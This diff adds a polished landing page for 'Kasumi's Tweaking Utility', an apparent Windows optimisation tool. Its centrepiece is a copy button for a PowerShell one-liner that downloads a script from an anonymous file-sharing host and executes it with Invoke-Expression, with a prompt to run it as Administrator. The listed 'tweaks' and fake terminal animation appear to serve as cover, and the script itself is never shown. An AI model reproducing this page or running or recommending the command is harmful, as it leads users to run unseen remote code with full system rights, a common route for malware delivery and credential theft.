@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Kasumi's Tweaking Utility</title>
+<script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+<script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+<script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;500;600;700;800&family=Noto+Serif+JP:wght@300;400&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#080808;
+  --bg-card:#0f0f0f;
+  --bg-card2:#141414;
+  --border:#1e1e1e;
+  --border-glow:#2a2a2a;
+  --text:#f0ede8;
+  --muted:#5a5a5a;
+  --muted2:#3a3a3a;
+  --accent:#c8a96e;
+  --accent2:#e8c98e;
+  --red:#c84b4b;
+  --green:#4bc87a;
+  --blue:#4b8ec8;
+  --purple:#8b6fc8;
+  --mono:'Space Mono',monospace;
+  --display:'Syne',sans-serif;
+  --jp:'Noto Serif JP',serif;
+}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:var(--display);overflow-x:hidden;cursor:crosshair}
+#root{min-height:100vh}
+
+::selection{background:var(--accent);color:#000}
+
+::-webkit-scrollbar{width:4px}
+::-webkit-scrollbar-track{background:#000}
+::-webkit-scrollbar-thumb{background:var(--muted2);border-radius:2px}
+
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+@keyframes scanline{0%{transform:translateY(-100%)}100%{transform:translateY(100vh)}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}
+@keyframes pulse{0%,100%{opacity:.4}50%{opacity:.8}}
+@keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
+@keyframes glitch{
+  0%{clip-path:inset(0 0 100% 0);transform:skewX(0deg)}
+  10%{clip-path:inset(20% 0 60% 0);transform:skewX(-2deg)}
+  20%{clip-path:inset(40% 0 40% 0);transform:skewX(2deg)}
+  30%{clip-path:inset(60% 0 20% 0);transform:skewX(-1deg)}
+  40%{clip-path:inset(80% 0 0% 0);transform:skewX(0deg)}
+  50%,100%{clip-path:inset(0 0 100% 0)}
+}
+@keyframes float{0%,100%{transform:translateY(0px)}50%{transform:translateY(-6px)}}
+
+.scanline-effect{
+  position:fixed;top:0;left:0;width:100%;height:200px;
+  background:linear-gradient(transparent,rgba(255,255,255,.015),transparent);
+  pointer-events:none;z-index:9999;animation:scanline 6s linear infinite;
+}
+
+.noise{
+  position:fixed;inset:0;opacity:.025;pointer-events:none;z-index:9998;
+  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+  background-size:128px;
+}
+</style>
+</head>
+<body>
+<div class="scanline-effect"></div>
+<div class="noise"></div>
+<div id="root"></div>
+
+<script type="text/babel">
+const { useState, useEffect, useRef } = React;
+
+const tweaks = [
+  { id: 1, category: "Performance", icon: "⚡", color: "#c8a96e", label: "CPU Priority Boost", desc: "Sets process priority and disables CPU throttling for maximum compute throughput." },
+  { id: 2, category: "Performance", icon: "⚡", color: "#c8a96e", label: "RAM Optimizer", desc: "Clears standby memory, trims working sets, and adjusts pagefile for optimal RAM usage." },
+  { id: 3, category: "Network", icon: "◈", color: "#4b8ec8", label: "TCP/IP Stack Tuning", desc: "Applies RFC-optimized TCP settings, disables Nagle algorithm, tunes buffer sizes." },
+  { id: 4, category: "Network", icon: "◈", color: "#4b8ec8", label: "DNS Cache Flush & Optimize", desc: "Flushes stale DNS entries and configures resolver timeouts for faster lookups." },
+  { id: 5, category: "Privacy", icon: "◉", color: "#8b6fc8", label: "Telemetry Disable", desc: "Disables Windows diagnostic data collection, CEIP, and feedback endpoints." },
+  { id: 6, category: "Privacy", icon: "◉", color: "#8b6fc8", label: "Activity History Clear", desc: "Wipes timeline data, clipboard history, and recent file tracking from the registry." },
+  { id: 7, category: "System", icon: "▸", color: "#4bc87a", label: "Service Cleanup", desc: "Disables non-essential background services — print spooler, fax, remote registry, and more." },
+  { id: 8, category: "System", icon: "▸", color: "#4bc87a", label: "Visual Effects Strip", desc: "Removes animations, transparency, and shadows for a clean, low-overhead desktop." },
+  { id: 9, category: "Gaming", icon: "◆", color: "#c84b4b", label: "Game Mode Enhancement", desc: "Enables GPU scheduling, disables HPET, and configures DPC latency for low-latency gaming." },
+  { id: 10, category: "Gaming", icon: "◆", color: "#c84b4b", label: "Input Lag Reduction", desc: "Disables mouse acceleration, adjusts USB polling rate, and sets raw input mode." },
+  { id: 11, category: "Storage", icon: "◧", color: "#c8a96e", label: "SSD TRIM & Optimize", desc: "Runs TRIM pass, defrag scheduler tuning, and write-cache buffer flushing." },
+  { id: 12, category: "Storage", icon: "◧", color: "#c8a96e", label: "Prefetch & Superfetch Tune", desc: "Adjusts prefetch parameters based on detected storage type (SSD vs HDD)." },
+];
+
+const categories = ["All", "Performance", "Network", "Privacy", "System", "Gaming", "Storage"];
+
+const CMD = `irm "https://files.catbox.moe/xlvcyk.ps1" | iex`;
+
+function CopyButton({ text }) {
+  const [copied, setCopied] = useState(false);
+  const copy = () => {
+    navigator.clipboard.writeText(text).then(() => {
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+    });
+  };
+  return (
+    <button onClick={copy} style={{
+      background: copied ? 'rgba(75,200,122,.1)' : 'rgba(200,169,110,.08)',
+      border: `1px solid ${copied ? 'rgba(75,200,122,.4)' : 'rgba(200,169,110,.25)'}`,
+      color: copied ? '#4bc87a' : '#c8a96e',
+      fontFamily: 'var(--mono)',
+      fontSize: '11px',
+      padding: '6px 14px',
+      borderRadius: '2px',
+      cursor: 'pointer',
+      letterSpacing: '0.05em',
+      transition: 'all .2s',
+      whiteSpace: 'nowrap',
+      flexShrink: 0,
+    }}>
+      {copied ? '✓ COPIED' : 'COPY'}
+    </button>
+  );
+}
+
+function TweakCard({ tweak, delay }) {
+  const [hovered, setHovered] = useState(false);
+  return (
+    <div
+      onMouseEnter={() => setHovered(true)}
+      onMouseLeave={() => setHovered(false)}
+      style={{
+        background: hovered ? 'var(--bg-card2)' : 'var(--bg-card)',
+        border: `1px solid ${hovered ? tweak.color + '33' : 'var(--border)'}`,
+        borderLeft: `2px solid ${hovered ? tweak.color : 'var(--border)'}`,
+        borderRadius: '2px',
+        padding: '16px 18px',
+        cursor: 'default',
+        transition: 'all .2s ease',
+        animation: `fadeUp .5s ease both`,
+        animationDelay: `${delay}ms`,
+        transform: hovered ? 'translateX(3px)' : 'none',
+        position: 'relative',
+        overflow: 'hidden',
+      }}
+    >
+      <div style={{ display: 'flex', alignItems: 'flex-start', gap: '12px' }}>
+        <span style={{ color: tweak.color, fontSize: '16px', flexShrink: 0, lineHeight: 1.4 }}>{tweak.icon}</span>
+        <div style={{ flex: 1, minWidth: 0 }}>
+          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '6px', flexWrap: 'wrap' }}>
+            <span style={{ color: 'var(--text)', fontSize: '13px', fontWeight: 700, letterSpacing: '.02em' }}>{tweak.label}</span>
+            <span style={{
+              background: tweak.color + '15',
+              border: `1px solid ${tweak.color}33`,
+              color: tweak.color,
+              fontSize: '9px',
+              fontFamily: 'var(--mono)',
+              padding: '2px 6px',
+              borderRadius: '1px',
+              letterSpacing: '.08em',
+            }}>{tweak.category.toUpperCase()}</span>
+          </div>
+          <p style={{ color: 'var(--muted)', fontSize: '12px', lineHeight: 1.6, fontFamily: 'var(--mono)' }}>{tweak.desc}</p>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function GlitchText({ text }) {
+  return (
+    <span style={{ position: 'relative', display: 'inline-block' }}>
+      {text}
+      <span aria-hidden style={{
+        position: 'absolute', inset: 0,
+        color: '#c8a96e',
+        animation: 'glitch 8s infinite',
+        opacity: .5,
+      }}>{text}</span>
+    </span>
+  );
+}
+
+function App() {
+  const [filter, setFilter] = useState("All");
+  const [termLine, setTermLine] = useState(0);
+
+  const termLines = [
+    "> Initializing Kasumi's Tweaking Utility...",
+    "> Scanning system configuration...",
+    "> Loading tweak modules: [12/12]",
+    "> Ready. Awaiting execution.",
+  ];
+
+  useEffect(() => {
+    if (termLine < termLines.length - 1) {
+      const t = setTimeout(() => setTermLine(v => v + 1), 600);
+      return () => clearTimeout(t);
+    }
+  }, [termLine]);
+
+  const filtered = filter === "All" ? tweaks : tweaks.filter(t => t.category === filter);
+
+  return (
+    <div style={{ minHeight: '100vh', background: 'var(--bg)' }}>
+
+      {/* Top bar */}
+      <div style={{
+        borderBottom: '1px solid var(--border)',
+        padding: '12px 32px',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'space-between',
+        position: 'sticky', top: 0, zIndex: 100,
+        background: 'rgba(8,8,8,.95)',
+        backdropFilter: 'blur(8px)',
+      }}>
+        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+          <div style={{ width: '7px', height: '7px', borderRadius: '50%', background: 'var(--green)', boxShadow: '0 0 6px var(--green)', animation: 'pulse 2s infinite' }}/>
+          <span style={{ fontFamily: 'var(--mono)', fontSize: '11px', color: 'var(--muted)', letterSpacing: '.1em' }}>KASUMI_TWEAK v2.4.1</span>
+        </div>
+        <div style={{ display: 'flex', gap: '6px' }}>
+          {['#c84b4b','#c8a96e','#4bc87a'].map((c,i) => (
+            <div key={i} style={{ width: '10px', height: '10px', borderRadius: '50%', background: c, opacity: .6 }}/>
+          ))}
+        </div>
+      </div>
+
+      {/* Hero */}
+      <section style={{ padding: '80px 32px 60px', maxWidth: '960px', margin: '0 auto' }}>
+
+        <div style={{ marginBottom: '16px', animation: 'fadeUp .4s ease both' }}>
+          <span style={{
+            fontFamily: 'var(--jp)',
+            fontSize: '13px',
+            color: 'var(--accent)',
+            letterSpacing: '.3em',
+            opacity: .7,
+          }}>霞 — 最適化ユーティリティ</span>
+        </div>
+
+        <h1 style={{
+          fontFamily: 'var(--display)',
+          fontSize: 'clamp(40px, 8vw, 88px)',
+          fontWeight: 800,
+          lineHeight: .95,
+          letterSpacing: '-0.03em',
+          marginBottom: '24px',
+          animation: 'fadeUp .5s ease both',
+          animationDelay: '.1s',
+        }}>
+          <span style={{ color: 'var(--text)', display: 'block' }}>KASUMI'S</span>
+          <span style={{ color: 'var(--accent)', display: 'block' }}>
+            <GlitchText text="TWEAKING" />
+          </span>
+          <span style={{ color: 'var(--muted)', display: 'block' }}>UTILITY</span>
+        </h1>
+
+        <p style={{
+          color: 'var(--muted)',
+          fontSize: '14px',
+          fontFamily: 'var(--mono)',
+          maxWidth: '480px',
+          lineHeight: 1.8,
+          marginBottom: '48px',
+          animation: 'fadeUp .5s ease both',
+          animationDelay: '.2s',
+        }}>
+          A precision Windows optimization suite. One command. Twelve targeted tweaks. Zero bloat.
+        </p>
+
+        {/* Terminal block */}
+        <div style={{
+          animation: 'fadeUp .5s ease both',
+          animationDelay: '.3s',
+          marginBottom: '20px',
+        }}>
+          <div style={{
+            background: '#050505',
+            border: '1px solid var(--border-glow)',
+            borderRadius: '4px',
+            overflow: 'hidden',
+            maxWidth: '620px',
+          }}>
+            {/* Terminal header */}
+            <div style={{
+              background: '#0c0c0c',
+              borderBottom: '1px solid var(--border)',
+              padding: '10px 16px',
+              display: 'flex',
+              alignItems: 'center',
+              gap: '8px',
+            }}>
+              <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: '#c84b4b' }}/>
+              <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: '#c8a96e' }}/>
+              <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: '#4bc87a' }}/>
+              <span style={{ fontFamily: 'var(--mono)', fontSize: '10px', color: 'var(--muted)', marginLeft: '8px', letterSpacing: '.05em' }}>Windows PowerShell</span>
+            </div>
+
+            {/* Terminal body - animated lines */}
+            <div style={{ padding: '16px 20px' }}>
+              {termLines.slice(0, termLine + 1).map((line, i) => (
+                <div key={i} style={{
+                  fontFamily: 'var(--mono)',
+                  fontSize: '12px',
+                  color: i === termLine ? 'var(--green)' : 'var(--muted)',
+                  marginBottom: '4px',
+                  transition: 'color .3s',
+                }}>{line}{i === termLine && termLine < termLines.length - 1 && (
+                  <span style={{ animation: 'blink 1s infinite', color: 'var(--green)' }}>█</span>
+                )}</div>
+              ))}
+
+              {termLine === termLines.length - 1 && (
+                <div style={{ marginTop: '12px', borderTop: '1px solid var(--border)', paddingTop: '12px' }}>
+                  <div style={{ fontFamily: 'var(--mono)', fontSize: '11px', color: 'var(--muted)', marginBottom: '8px' }}>
+                    PS C:\Users\User&gt; <span style={{ color: 'var(--text)' }}>Run as Administrator</span>
+                  </div>
+                  <div style={{
+                    display: 'flex',
+                    alignItems: 'center',
+                    gap: '10px',
+                    background: 'rgba(200,169,110,.05)',
+                    border: '1px solid rgba(200,169,110,.15)',
+                    borderRadius: '2px',
+                    padding: '10px 14px',
+                  }}>
+                    <span style={{ color: 'var(--muted)', fontFamily: 'var(--mono)', fontSize: '12px', flexShrink: 0 }}>PS&gt;</span>
+                    <code style={{
+                      fontFamily: 'var(--mono)',
+                      fontSize: '13px',
+                      color: '#e8c98e',
+                      flex: 1,
+                      letterSpacing: '.02em',
+                    }}>{CMD}</code>
+                    <CopyButton text={CMD} />
+                  </div>
+                </div>
+              )}
+            </div>
+          </div>
+        </div>
+
+        <p style={{
+          fontFamily: 'var(--mono)',
+          fontSize: '10px',
+          color: 'var(--muted2)',
+          letterSpacing: '.05em',
+          animation: 'fadeUp .5s ease both',
+          animationDelay: '.4s',
+        }}>⚠ REQUIRES ADMINISTRATOR — RIGHT-CLICK POWERSHELL → RUN AS ADMINISTRATOR</p>
+      </section>
+
+      {/* Divider */}
+      <div style={{ borderTop: '1px solid var(--border)', maxWidth: '960px', margin: '0 auto 60px', padding: '0 32px' }}>
+        <div style={{ height: '1px', background: 'linear-gradient(90deg, var(--accent), transparent)', width: '200px', marginTop: '-1px' }}/>
+      </div>
+
+      {/* Tweaks section */}
+      <section style={{ maxWidth: '960px', margin: '0 auto', padding: '0 32px 100px' }}>
+        <div style={{ display: 'flex', alignItems: 'baseline', justifyContent: 'space-between', marginBottom: '32px', flexWrap: 'wrap', gap: '16px' }}>
+          <div>
+            <h2 style={{ fontFamily: 'var(--display)', fontSize: '11px', color: 'var(--muted)', letterSpacing: '.2em', marginBottom: '6px' }}>WHAT GETS APPLIED</h2>
+            <p style={{ fontFamily: 'var(--display)', fontSize: '22px', fontWeight: 700, color: 'var(--text)', letterSpacing: '-.02em' }}>
+              {filtered.length} <span style={{ color: 'var(--muted)', fontWeight: 400 }}>tweaks active</span>
+            </p>
+          </div>
+
+          {/* Filter pills */}
+          <div style={{ display: 'flex', gap: '6px', flexWrap: 'wrap' }}>
+            {categories.map(cat => (
+              <button key={cat} onClick={() => setFilter(cat)} style={{
+                background: filter === cat ? 'var(--accent)' : 'transparent',
+                border: `1px solid ${filter === cat ? 'var(--accent)' : 'var(--border-glow)'}`,
+                color: filter === cat ? '#000' : 'var(--muted)',
+                fontFamily: 'var(--mono)',
+                fontSize: '10px',
+                padding: '5px 12px',
+                borderRadius: '2px',
+                cursor: 'pointer',
+                letterSpacing: '.08em',
+                transition: 'all .15s',
+                fontWeight: filter === cat ? 700 : 400,
+              }}>{cat.toUpperCase()}</button>
+            ))}
+          </div>
+        </div>
+
+        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(380px, 1fr))', gap: '8px' }}>
+          {filtered.map((tweak, i) => (
+            <TweakCard key={tweak.id} tweak={tweak} delay={i * 40} />
+          ))}
+        </div>
+      </section>
+
+      {/* Bottom stats bar */}
+      <div style={{
+        borderTop: '1px solid var(--border)',
+        background: 'var(--bg-card)',
+        padding: '20px 32px',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'center',
+        gap: '48px',
+        flexWrap: 'wrap',
+      }}>
+        {[
+          { label: 'TWEAKS', value: '12' },
+          { label: 'CATEGORIES', value: '6' },
+          { label: 'EXEC TIME', value: '<30s' },
+          { label: 'VERSION', value: '2.4.1' },
+        ].map(stat => (
+          <div key={stat.label} style={{ textAlign: 'center' }}>
+            <div style={{ fontFamily: 'var(--mono)', fontSize: '20px', fontWeight: 700, color: 'var(--accent)', letterSpacing: '-.01em' }}>{stat.value}</div>
+            <div style={{ fontFamily: 'var(--mono)', fontSize: '9px', color: 'var(--muted)', letterSpacing: '.15em', marginTop: '2px' }}>{stat.label}</div>
+          </div>
+        ))}
+      </div>
+
+      {/* Footer */}
+      <div style={{
+        borderTop: '1px solid var(--border)',
+        padding: '16px 32px',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'space-between',
+        flexWrap: 'wrap',
+        gap: '8px',
+      }}>
+        <span style={{ fontFamily: 'var(--jp)', fontSize: '12px', color: 'var(--muted2)', letterSpacing: '.1em' }}>霞 kasumi</span>
+        <span style={{ fontFamily: 'var(--mono)', fontSize: '10px', color: 'var(--muted2)', letterSpacing: '.05em' }}>USE AT YOUR OWN RISK — BACKUP RECOMMENDED</span>
+      </div>
+
+    </div>
+  );
+}
+
+ReactDOM.createRoot(document.getElementById('root')).render(<App />);
+</script>
+</body>
+</html>
